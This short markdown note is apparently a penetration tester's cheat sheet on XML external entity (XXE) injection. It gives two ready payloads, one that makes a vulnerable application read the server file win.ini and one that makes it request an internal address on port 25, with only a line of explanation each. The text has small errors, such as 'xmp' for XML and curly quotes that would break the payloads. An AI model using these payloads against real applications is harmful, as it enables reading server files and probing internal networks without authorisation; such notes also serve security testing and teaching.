# XXE
If xmp is used in the request,you can get xxe using the following
This will cause the app to fetch the file win.ini: 
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM “file:///windows/win.ini” > ]> 
<Search><SearchTerm>&xxe;</SearchTerm></Search> 
``` 

This will cause the app to fetch a resource form another site: 
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM “http://192.168.1.1:25” > ]> 
<Search><SearchTerm>&xxe;</SearchTerm></Search>
```
